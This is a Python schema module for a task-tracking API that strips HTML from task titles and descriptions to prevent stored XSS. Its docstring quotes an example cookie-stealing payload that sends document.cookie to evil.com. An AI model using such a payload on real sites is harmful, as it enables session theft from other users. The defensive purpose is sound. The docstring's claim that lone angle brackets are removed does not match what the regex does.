"""task-service schemas.

Fix #11 — Stored XSS prevention:
  Task titles and descriptions are user-supplied text that gets stored in
  PostgreSQL and returned verbatim. If a frontend renders these fields as
  HTML (even unintentionally via a markdown renderer), stored XSS payloads
  like <script>fetch('https://evil.com?c='+document.cookie)</script> in a
  task title execute in every other user's browser.

  Fix: strip HTML tags from title and description at schema validation time.
  We use a strict regex rather than a parser to avoid introducing an HTML
  parsing library dependency. Characters like < and > are removed entirely
  (not escaped) because task titles have no legitimate need for angle brackets.

  NOTE: For richer content (markdown with allowed formatting), use bleach
  or html-sanitizer with an explicit allowlist instead.
"""
import re
import uuid
from datetime import datetime
from pydantic import BaseModel, Field, field_validator
from app.models import TaskStatus, TaskPriority

# Matches any HTML tag including attributes, self-closing tags, and comments.
# Captures <tag>, </tag>, <tag attr="val">, <!-- comment -->
_HTML_TAG_RE = re.compile(r"<[^>]*>", re.DOTALL)


def _strip_html(value: str | None) -> str | None:
    """Remove HTML tags from a string. Returns None unchanged."""
    if value is None:
        return None
    return _HTML_TAG_RE.sub("", value).strip()


class ProjectCreate(BaseModel):
    name: str = Field(min_length=1, max_length=255)
    description: str | None = None


class ProjectResponse(BaseModel):
    id: uuid.UUID
    name: str
    description: str | None
    owner_id: uuid.UUID
    is_active: bool
    created_at: datetime
    model_config = {"from_attributes": True}


class TaskCreate(BaseModel):
    title: str = Field(min_length=1, max_length=500)
    description: str | None = None
    # SECURITY: status is NOT a client-settable field at creation time.
    # All tasks start as TODO regardless of client input. Allowing clients
    # to set status=DONE on creation bypasses any workflow enforcement.
    priority: TaskPriority = TaskPriority.MEDIUM
    project_id: uuid.UUID
    assignee_id: uuid.UUID | None = None
    due_date: datetime | None = None

    # FIX #11: Strip HTML tags before storing. Runs AFTER length validation
    # so a padded XSS payload like '     <script>...</script>     ' can't
    # bypass the max_length check and still slip through.
    @field_validator("title", mode="after")
    @classmethod
    def sanitize_title(cls, v: str) -> str:
        cleaned = _strip_html(v) or ""
        if not cleaned:
            raise ValueError("Title must not be empty after HTML is removed")
        return cleaned

    @field_validator("description", mode="after")
    @classmethod
    def sanitize_description(cls, v: str | None) -> str | None:
        return _strip_html(v)


class TaskUpdate(BaseModel):
    title: str | None = Field(None, min_length=1, max_length=500)
    description: str | None = None
    status: TaskStatus | None = None
    priority: TaskPriority | None = None
    assignee_id: uuid.UUID | None = None
    due_date: datetime | None = None

    # PATCH semantics: use model_dump(exclude_unset=True) NOT exclude_none=True.
    # exclude_none would silently drop intentional null values (e.g. clearing
    # an assignee or description), making it impossible to un-set nullable fields.

    @field_validator("title", mode="after")
    @classmethod
    def sanitize_title(cls, v: str | None) -> str | None:
        if v is None:
            return v
        cleaned = _strip_html(v) or ""
        if not cleaned:
            raise ValueError("Title must not be empty after HTML is removed")
        return cleaned

    @field_validator("description", mode="after")
    @classmethod
    def sanitize_description(cls, v: str | None) -> str | None:
        return _strip_html(v)


class TaskResponse(BaseModel):
    id: uuid.UUID
    title: str
    description: str | None
    status: TaskStatus
    priority: TaskPriority
    project_id: uuid.UUID
    creator_id: uuid.UUID
    assignee_id: uuid.UUID | None
    due_date: datetime | None
    created_at: datetime
    updated_at: datetime
    model_config = {"from_attributes": True}
